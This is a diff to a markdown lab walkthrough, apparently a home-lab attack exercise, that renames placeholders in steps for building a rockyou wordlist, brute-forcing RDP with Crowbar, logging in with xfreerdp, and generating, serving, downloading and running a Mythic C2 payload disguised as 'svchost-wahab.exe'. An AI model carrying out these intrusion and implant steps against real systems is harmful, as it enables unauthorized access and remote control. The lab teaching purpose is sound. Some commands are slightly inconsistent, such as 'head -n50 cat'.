@@ -43,7 +43,7 @@ sudo gunzip rockyou.txt.gz
 Extract first 50 entries and add `Winter2024!` to the list.
 
 ```
-head -n50 cat rockyou.txt > /home/user/Desktop/Challenge-Wordlist.txt
+head -n50 cat rockyou.txt > /home/user/Desktop/madeup-Wordlist.txt
 ```
 
 
@@ -73,7 +73,7 @@ Create target file with Windows server IP and username.
 Use Crowbar to authenticate with the target IP address using CIDR notation.
 
 ```
-crowbar -b rdp -u administrator -C Challenge-Wordlist.txt -s <Challenge-WIN-Haji-IP>/32
+crowbar -b rdp -u administrator -C madeup-Wordlist.txt -s <MyDFIR-WIN-Wahab-IP>/32
 ```
 
 Successful RDP login with username `Administrator` and password `Winter2024!`.
@@ -85,7 +85,7 @@ Use `xfreerdp` to connect to the Windows server.
 Command: 
 
 ```
-xfreerdp /u:Administrator /p:Winter2024! /v:<Challenge-WIN-Haji-IP>:3389
+xfreerdp /u:Administrator /p:Winter2024! /v:<MyDFIR-WIN-Wahab-IP>:3389
 ```
 
 Trust the certificate and establish RDP connection.
@@ -147,9 +147,9 @@ Command:
 
 - Generate new payload in Mythic web GUI.
 - Select target machine (Windows) and output format (Windows Executable).
-- Include all available commands and set callback host to Mythic server IP in format `http://<Challenge-Mythic-IP>`
+- Include all available commands and set callback host to Mythic server IP in format `http://<MyDFIR-Mythic-IP>`
 - Set port `80` and leave everything else as default.
-- Name the payload `ChallengeMythicPayload`
+- Name the payload `MyDFIRMythicPayload`
 
 ## 9. Downloading and Executing the Payload
 
@@ -164,7 +164,7 @@ Rename the downloaded file to `servicehost-wahab.exe`.
 **2. Serve Payload via HTTP**:
    
 Create a directory and move the payload into it.
-Allow port 9999 on `Challenge-Mythic` using
+Allow port 9999 on `MyDFIR-Mythic` using
 
 ```
 ufw allow 9999
@@ -185,7 +185,7 @@ Use PowerShell to download the payload from the Mythic server.
 Command:
 
 ```
-Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/svchost-wahab.exe -OutFile C:\Users\Administrator\Downloads\svchost-wahab.exe
+Invoke-WebRequest -Uri http://<MyDFIR-Mythic-IP>:9999/svchost-wahab.exe -OutFile C:\Users\Administrator\Downloads\svchost-wahab.exe
 ```
 
 **Execute Payload**:
@@ -194,7 +194,7 @@ Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/svchost-wahab.exe -OutF
 .\svchost-wahab.exe
 ```
 
-Allow the port `80` communication on `Challenge-Mythic` Server using
+Allow the port `80` communication on `MyDFIR-Mythic` Server using
 
 ```
 ufw allow port 80
